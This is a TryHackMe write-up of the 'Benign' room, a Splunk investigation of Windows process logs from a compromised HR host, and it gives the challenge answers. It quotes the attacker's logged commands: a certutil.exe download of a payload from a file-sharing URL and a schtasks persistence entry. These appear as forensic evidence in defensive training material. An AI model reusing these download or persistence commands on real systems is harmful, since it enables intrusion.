---
title: "Benign - TryHackMe Write-up"
seoTitle: "Benign - TryHackMe Write-up"
seoDescription: "Explore the TryHackMe Benign challenge with Splunk logs investigation of HR department's network compromise. Find answers and detailed insights"
datePublished: Thu Aug 07 2025 11:58:06 GMT+0000 (Coordinated Universal Time)
cuid: cme1cf1zn000402jr6h0adct9
slug: benign-tryhackme-write-up
canonical: https://medium.com/@forrestcaffray/benign-tryhackme-5f01dfd0f386
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1754478101786/83508194-7d2e-414b-a791-65b22025d9bc.png
tags: cybersecurity, tryhackme, writeup, tryhackme-walkthrough

---

Link to room: [https://tryhackme.com/room/benign](https://tryhackme.com/room/benign)

> One of the client’s IDS indicated a potentially suspicious process execution indicating one of the hosts from the HR department was compromised. Some tools related to network information gathering / scheduled tasks were executed which confirmed the suspicion. Due to limited resources, we could only pull the process execution logs with Event ID: 4688 and ingested them into Splunk with the index **win\_eventlogs** for further investigation.

---

> How many logs are ingested from the month of March, 2022?

We want to set `index="win_eventlogs"` in the new Search and set the date range for the duration of March 2022:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754479447530/a2a40fa5-9511-4bda-988a-2ef7240d250b.png align="center")

We can see the result here:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754558004100/739ae7ef-a3ca-4e32-9cce-659aa82eca56.png align="center")

## `= 13959`

---

> Imposter Alert: There seems to be an imposter account observed in the logs, what is the name of that user?

To find this I filtered via `UserName` field and then `Rare values` and noticed this:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754558680084/1a3d6c0f-032d-41e1-b019-53dfd9d6de5f.png align="center")

There is a UserName of `Amelia` which seems innocent enough, but as you can also see there is a UserName of `Amel1a` which definitely does not seem so innocent.

## `= Amel1a`

---

> Which user from the HR department was observed to be running scheduled tasks?

I searched for `index="win_eventlogs" schtasks` as a sort of blanket to see what pops up.

I got 87 events, so still a bit too much to look through. We are looking at which user, so clicked on UserName in Fields and spotted this:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754559686885/1b8f1e3a-e298-4dad-8b41-721c371a84b8.png align="center")

Just one count for Chris.fort with this CommandLine being of interest:

`CommandLine: /create /tn OfficUpdater /tr "C:\Users\Chris.fort\AppData\Local\Temp\update.exe" /sc onstart`

## `= Chris.fort`

---

> Which user from the HR department executed a system process (LOLBIN) to download a payload from a file-sharing host.

There is a hint to checkout [https://lolbas-project.github.io/](https://lolbas-project.github.io/), so let’s go ahead and do just that! These are all Binaries, Scripts and Libraries default to the system, ready to be used.

We are also looking at the HR department which consists of:

**HR department  
**

* Haroon
    
* Chris
    
* Diana
    

So we are looking at Haroon, Chris or Diana using one of the LOBAS listed on the github.io page. There’s too many results to filter via UserName in this instance and perhaps too many LOLBIN processes.

However, we know that they downloaded a payload, so an elegant way of filtering might be by adding:

`CommandLine="*http*" OR CommandLine="*https*"`

Indeed we get 1 results from Haroon:

```yaml
 { [-]
   Category: Process Creation
   Channel: Windows
   CommandLine:  certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
   EventID: 4688
   EventTime: 2022-03-04T10:38:28Z
   EventType: AUDIT_SUCCESS
   HostName: HR_01
   NewProcessId: 0x82194b
   Opcode: Info
   ProcessID: 9912
   ProcessName: C:\Windows\System32\certutil.exe
   Severity: INFO
   SeverityValue: 2
   SourceModuleName: eventlog
   SourceModuleType: Win_event_log
   SourceName: Microsoft-Windows-Security-Auditing
   SubjectDomainName: cybertees.local
   UserName: haroon
   index: winlogs
} 
```

this snippet being a bit juicy:

`CommandLine: certutil.exe -urlcache -f -` [`https://controlc.com/e4d11035`](https://controlc.com/e4d11035) `benign.exe`

We can see they used `certutil.exe` that is listed on the github page with description of “Windows binary used for handling certificates”

## `= haroon`

---

> To bypass the security controls, which system process (lolbin) was used to download a payload from the internet?

Well, we already answered this!

## `= certutil.exe`

---

> What was the date that this binary was executed by the infected host? format (YYYY-MM-DD)

We can look at the exact same results and notice this line:

`EventTime: 2022-03-04T10:38:28Z`

## `= 2022-03-04`

---

> Which third-party site was accessed to download the malicious payload?

Again, all the information is there, looking at:

`CommandLine: certutil.exe -urlcache -f -` [`https://controlc.com/e4d11035`](https://controlc.com/e4d11035) `benign.exe`

## `= controlc.com`

---

> What is the name of the file that was saved on the host machine from the C2 server during the post-exploitation phase?

We can see from:

`CommandLine: certutil.exe -urlcache -f -` [`https://controlc.com/e4d11035`](https://controlc.com/e4d11035) `benign.exe`

## `= benign.exe`

---

> The suspicious file downloaded from the C2 server contained malicious content with the pattern THM{..........}; what is that pattern?

For this one I just navigated to [`https://controlc.com/e4d11035`](https://controlc.com/e4d11035)

Upon finding the flag

## `= THM{________}`

---

> What is the URL that the infected host connected to?

We already know this :)

## [`= https://controlc.com/e4d11035`](https://controlc.com/e4d11035)

---

I enjoyed this wee exercise getting more familiar with Splunk, hope this write up helped!